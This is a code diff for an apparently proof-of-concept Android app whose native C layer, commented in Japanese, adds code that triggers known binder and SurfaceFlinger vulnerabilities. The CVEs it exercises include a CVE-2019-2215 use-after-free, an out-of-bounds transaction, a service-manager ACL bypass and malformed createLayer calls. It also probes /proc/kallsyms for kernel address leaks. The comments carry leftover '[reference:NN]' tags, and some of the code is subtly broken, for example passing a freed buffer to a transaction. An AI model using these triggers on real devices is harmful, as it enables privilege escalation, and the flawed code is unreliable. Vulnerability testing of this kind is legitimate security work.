@@ -9,6 +9,8 @@
 #include <sys/ioctl.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/epoll.h>
+#include <pthread.h>
 #include <linux/types.h>
 
 #include "binder.h"
@@ -17,23 +19,344 @@
 #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 
-jbyteArray Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv*, jclass, jint, jint, jint, jint, jbyteArray);
+#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
+#define BINDER_SET_MAX_THREADS _IOW('b', 5, __u32)
 
+// CVE-2019-2215: Use-After-Free via epoll + BINDER_THREAD_EXIT[reference:18]
 JNIEXPORT jint JNICALL
-Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
-    if (path == NULL) return -1;
-    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
-    if (cpath == NULL) return -1;
-    int fd = open(cpath, O_RDWR);
-    if (fd < 0) {
-        LOGE("open(%s) failed: %s", cpath, strerror(errno));
-        (*env)->ReleaseStringUTFChars(env, path, cpath);
-        return -errno;
+Java_com_example_tzpoc_MainActivity_nativeEpollTest(JNIEnv* env, jclass clazz, jint fd) {
+    int epfd = epoll_create(1000);
+    if (epfd < 0) {
+        LOGE("epoll_create failed: %s", strerror(errno));
+        return -1;
     }
-    (*env)->ReleaseStringUTFChars(env, path, cpath);
-    return fd;
+
+    struct epoll_event ev;
+    memset(&ev, 0, sizeof(ev));
+    ev.events = EPOLLIN;
+
+    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        LOGE("epoll_ctl ADD failed: %s", strerror(errno));
+        close(epfd);
+        return -1;
+    }
+
+    // BINDER_THREAD_EXIT を呼び出し、binder_thread を解放[reference:19][reference:20]
+    int ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
+    LOGD("BINDER_THREAD_EXIT returned: %d", ret);
+
+    // epoll_wait で解放済み binder_thread にアクセス（UAF トリガー）[reference:21]
+    struct epoll_event events[1];
+    ret = epoll_wait(epfd, events, 1, 10);
+
+    close(epfd);
+
+    if (ret < 0) {
+        LOGE("epoll_wait failed: %s", strerror(errno));
+        return -1;
+    } else if (ret == 0) {
+        LOGD("epoll_wait returned 0 (timeout) - no UAF triggered");
+        return 0;
+    } else {
+        LOGD("epoll_wait returned %d - UAF MAY have been triggered!", ret);
+        return -2;
+    }
 }
 
+// CVE-2019-2215: BINDER_THREAD_EXIT 単体テスト
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderThreadExit(JNIEnv* env, jclass clazz, jint fd) {
+    int ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
+    LOGD("BINDER_THREAD_EXIT returned: %d", ret);
+    return ret;
+}
+
+// CVE-2020-0041: Out-of-Bounds Write テスト[reference:22]
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderOutOfBoundsTest(JNIEnv* env, jclass clazz, jint fd) {
+    // 不正なオフセットを含むトランザクションデータを構築
+    // 境界チェックの誤りによる OOB 書き込みを誘発[reference:23]
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+        uint8_t padding[256];
+    } __attribute__((packed)) tx;
+
+    memset(&tx, 0, sizeof(tx));
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 0;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 0xFFFFFFFF;  // 異常なサイズ
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = 0;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+
+    uint8_t read_buf[4096];
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    LOGD("BINDER_WRITE_READ (OOB test) returned: %d, errno=%d", ret, errno);
+
+    if (ret < 0) {
+        if (errno == EFAULT || errno == EINVAL) {
+            LOGD("OOB test: patched (returned error)");
+            return -1;
+        }
+        LOGE("OOB test: unexpected error: %s", strerror(errno));
+        return -1;
+    }
+
+    LOGD("OOB test: transaction succeeded (may be vulnerable)");
+    return 0;
+}
+
+// CVE-2019-2023: hwservicemanager ACL bypass テスト[reference:24]
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeHwServiceManagerAddTest(JNIEnv* env, jclass clazz, jint fd, jstring serviceName) {
+    if (serviceName == NULL) return -1;
+
+    const char* name = (*env)->GetStringUTFChars(env, serviceName, NULL);
+    if (name == NULL) return -1;
+
+    size_t len = strlen(name) + 1;
+    uint8_t* data = malloc(4 + len);
+    if (data == NULL) {
+        (*env)->ReleaseStringUTFChars(env, serviceName, name);
+        return -1;
+    }
+
+    // パーセルフォーマット: 長さ(4) + 文字列(null終端)
+    data[0] = (uint8_t)(len & 0xFF);
+    data[1] = (uint8_t)((len >> 8) & 0xFF);
+    data[2] = (uint8_t)((len >> 16) & 0xFF);
+    data[3] = (uint8_t)((len >> 24) & 0xFF);
+    memcpy(data + 4, name, len);
+
+    (*env)->ReleaseStringUTFChars(env, serviceName, name);
+
+    // SVC_MGR_ADD_SERVICE: handle=0, code=2 (add service)
+    jbyteArray jdata = (*env)->NewByteArray(env, 4 + len);
+    (*env)->SetByteArrayRegion(env, jdata, 0, 4 + len, (jbyte*)data);
+    free(data);
+
+    // Java_com_example_tzpoc_MainActivity_nativeBinderTransaction を直接呼び出せないので
+    // ここで直接 ioctl を実行
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+
+    memset(&tx, 0, sizeof(tx));
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 2;  // SVC_MGR_ADD_SERVICE
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 4 + len;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+
+    uint8_t read_buf[4096];
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    LOGD("SVC_MGR_ADD_SERVICE (%s) returned: %d, errno=%d", (char*)(data + 4), ret, errno);
+
+    if (ret == 0) {
+        return 0;  // SUCCESS - vulnerable!
+    } else if (errno == EACCES || errno == EPERM) {
+        return -1;  // Permission denied - patched
+    } else if (errno == EEXIST) {
+        return -2;  // Service already exists
+    }
+
+    return ret;
+}
+
+// CVE-2020-0273: hwservicemanager wild pointer free テスト[reference:25]
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass clazz, jint fd, jint cmd, jlong arg) {
+    int ret = ioctl(fd, cmd, (unsigned long)arg);
+    LOGD("ioctl(0x%x) returned: %d, errno=%d", cmd, ret, errno);
+    return ret;
+}
+
+// SurfaceFlinger CVE-2020-0392 (double free) / CVE-2019-2194 (improper casting) テスト[reference:26][reference:27]
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeSurfaceFlingerLayerTest(JNIEnv* env, jclass clazz, jint fd) {
+    // createLayer を不正なパラメータで呼び出し
+    // 参考: CVE-2019-2194 - improper casting in createLayer[reference:28]
+    // 参考: CVE-2020-0392 - double free in getLayerDebugInfo[reference:29]
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+        uint8_t data[64];
+    } __attribute__((packed)) tx;
+
+    memset(&tx, 0, sizeof(tx));
+
+    // SurfaceFlinger のハンドルを取得
+    // 通常は handle=0 ではないが、ここでは context manager に問い合わせる
+    // まず GET_SERVICE で SurfaceFlinger のハンドルを取得
+    uint8_t* getSvcData = malloc(4 + 32);
+    if (getSvcData == NULL) return -1;
+    const char* sf_desc = "android.ui.ISurfaceComposer";
+    size_t sf_len = strlen(sf_desc) + 1;
+    getSvcData[0] = (uint8_t)(sf_len & 0xFF);
+    getSvcData[1] = (uint8_t)((sf_len >> 8) & 0xFF);
+    getSvcData[2] = (uint8_t)((sf_len >> 16) & 0xFF);
+    getSvcData[3] = (uint8_t)((sf_len >> 24) & 0xFF);
+    memcpy(getSvcData + 4, sf_desc, sf_len);
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) getSvcTx;
+
+    memset(&getSvcTx, 0, sizeof(getSvcTx));
+    getSvcTx.cmd = BC_TRANSACTION;
+    getSvcTx.tdata.target.handle = 0;
+    getSvcTx.tdata.code = 1;  // GET_SERVICE
+    getSvcTx.tdata.data_size = 4 + sf_len;
+    getSvcTx.tdata.offsets_size = 0;
+    getSvcTx.tdata.data.ptr.buffer = (binder_uintptr_t)getSvcData;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(getSvcTx);
+    bwr.write_buffer = (binder_uintptr_t)&getSvcTx;
+
+    uint8_t read_buf[4096];
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    free(getSvcData);
+
+    if (ret < 0 || bwr.read_consumed < 4) {
+        LOGD("SurfaceFlinger GET_SERVICE failed");
+        return -1;
+    }
+
+    int sfHandle = *(int*)read_buf;
+    LOGD("SurfaceFlinger handle: %d (0x%x)", sfHandle, sfHandle);
+
+    if (sfHandle == 0) {
+        LOGD("SurfaceFlinger handle is 0, using handle=0");
+        sfHandle = 0;
+    }
+
+    // createLayer を不正なパラメータで呼び出し（CVE-2019-2194）[reference:30]
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = sfHandle;
+    tx.tdata.code = 6;  // createLayer[reference:31]
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 32;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)tx.data;
+
+    // 不正なパラメータ: 無効な displayId, layerId, 異常なサイズ
+    *(int*)(tx.data) = 0xFFFFFFFF;      // invalid displayId
+    *(int*)(tx.data + 4) = 0xFFFFFFFF;  // invalid layerId
+    *(int*)(tx.data + 8) = 0;           // what
+    *(int*)(tx.data + 12) = 0;          // x
+    *(int*)(tx.data + 16) = 0;          // y
+    *(int*)(tx.data + 20) = 10000;      // w (異常な値)
+    *(int*)(tx.data + 24) = 10000;      // h (異常な値)
+
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    LOGD("SurfaceFlinger createLayer test returned: %d, errno=%d", ret, errno);
+
+    if (ret == 0) {
+        LOGD("createLayer succeeded (unexpected - may be vulnerable)");
+        return 0;
+    } else if (errno == EACCES || errno == EPERM) {
+        LOGD("createLayer: permission denied (patched or restricted)");
+        return -1;
+    } else if (errno == EINVAL) {
+        LOGD("createLayer: invalid argument (patched)");
+        return -1;
+    }
+
+    return ret;
+}
+
+// Kernel Info Leak Test
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeKernelInfoLeakTest(JNIEnv* env, jclass clazz, jint fd) {
+    // 複数の BINDER_VERSION 呼び出しでカーネルポインタがリークするかテスト
+    struct binder_version ver;
+    int leaked = 0;
+
+    for (int i = 0; i < 10; i++) {
+        memset(&ver, 0, sizeof(ver));
+        int ret = ioctl(fd, BINDER_VERSION, &ver);
+        if (ret == 0) {
+            LOGD("BINDER_VERSION: protocol=%d", ver.protocol_version);
+            // ポインタがリークしている可能性のある値をチェック
+            if (ver.protocol_version > 100 || ver.protocol_version < 0) {
+                leaked++;
+            }
+        }
+    }
+
+    // カーネルアドレスが含まれる可能性のある /proc/kallsyms をチェック
+    FILE* fp = fopen("/proc/kallsyms", "r");
+    if (fp != NULL) {
+        char line[256];
+        int count = 0;
+        while (fgets(line, sizeof(line), fp) != NULL && count < 10) {
+            // カーネルアドレスっぽいパターンをチェック
+            if (strstr(line, " f ") != NULL || strstr(line, " t ") != NULL) {
+                count++;
+            }
+        }
+        fclose(fp);
+        if (count > 0) {
+            LOGD("Found %d kernel symbols in /proc/kallsyms", count);
+            leaked += count;
+        }
+    }
+
+    // /proc/self/stack もチェック
+    fp = fopen("/proc/self/stack", "r");
+    if (fp != NULL) {
+        char line[256];
+        int count = 0;
+        while (fgets(line, sizeof(line), fp) != NULL && count < 5) {
+            if (strstr(line, "0x") != NULL) {
+                count++;
+            }
+        }
+        fclose(fp);
+        if (count > 0) {
+            LOGD("Found %d kernel addresses in /proc/self/stack", count);
+            leaked += count;
+        }
+    }
+
+    return leaked > 0 ? leaked : 0;
+}
+
+// 汎用トランザクション
 JNIEXPORT jbyteArray JNICALL
 Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv* env, jclass clazz,
                                                              jint fd, jint handle, jint code, jint flags, jbyteArray data) {
@@ -135,89 +458,18 @@ Java_com_example_tzpoc_MainActivity_nativeBinderDumpReply(JNIEnv* env, jclass cl
     return (*env)->NewStringUTF(env, result);
 }
 
-JNIEXPORT jbyteArray JNICALL
-Java_com_example_tzpoc_MainActivity_nativeBuildMalformedParcel(JNIEnv* env, jclass clazz, jint type, jint extra) {
-    uint8_t* data = NULL;
-    int len = 0;
-
-    switch (type) {
-        case 0: // empty data (no parcel)
-            return NULL;
-
-        case 1: // length field only (no string)
-            len = 4;
-            data = malloc(len);
-            if (data == NULL) return NULL;
-            memset(data, 0, len);
-            data[0] = 0x01;
-            data[1] = 0x00;
-            data[2] = 0x00;
-            data[3] = 0x00;
-            break;
-
-        case 2: // length > actual data (len=100, data="a")
-            len = 4 + 2;
-            data = malloc(len);
-            if (data == NULL) return NULL;
-            memset(data, 0, len);
-            data[0] = 100;
-            data[1] = 0;
-            data[2] = 0;
-            data[3] = 0;
-            data[4] = 'a';
-            data[5] = 0;
-            break;
-
-        case 3: // length < actual data (len=1, data="test\0")
-            len = 4 + 5;
-            data = malloc(len);
-            if (data == NULL) return NULL;
-            memset(data, 0, len);
-            data[0] = 1;
-            data[1] = 0;
-            data[2] = 0;
-            data[3] = 0;
-            memcpy(data + 4, "test", 4);
-            data[8] = 0;
-            break;
-
-        case 4: // data with null bytes inside (invalid string)
-            len = 4 + 10;
-            data = malloc(len);
-            if (data == NULL) return NULL;
-            memset(data, 0, len);
-            data[0] = 10;
-            data[1] = 0;
-            data[2] = 0;
-            data[3] = 0;
-            memcpy(data + 4, "a\0b\0c\0d\0", 8);
-            break;
-
-        case 5: // length with negative value (0xFFFFFFFF)
-            len = 4;
-            data = malloc(len);
-            if (data == NULL) return NULL;
-            memset(data, 0xFF, len);
-            break;
-
-        case 6: // extra large length (0x7FFFFFFF)
-            len = 4;
-            data = malloc(len);
-            if (data == NULL) return NULL;
-            data[0] = 0xFF;
-            data[1] = 0xFF;
-            data[2] = 0xFF;
-            data[3] = 0x7F;
-            break;
-
-        default:
-            return NULL;
+// /dev/binder オープン
+JNIEXPORT jint JNICALL
+Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
+    if (path == NULL) return -1;
+    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
+    if (cpath == NULL) return -1;
+    int fd = open(cpath, O_RDWR);
+    if (fd < 0) {
+        LOGE("open(%s) failed: %s", cpath, strerror(errno));
+        (*env)->ReleaseStringUTFChars(env, path, cpath);
+        return -errno;
     }
-
-    jbyteArray result = (*env)->NewByteArray(env, len);
-    if (result != NULL) {
-        (*env)->SetByteArrayRegion(env, result, 0, len, (jbyte*)data);
-    }
-    free(data);
-    return result;
+    (*env)->ReleaseStringUTFChars(env, path, cpath);
+    return fd;
 }
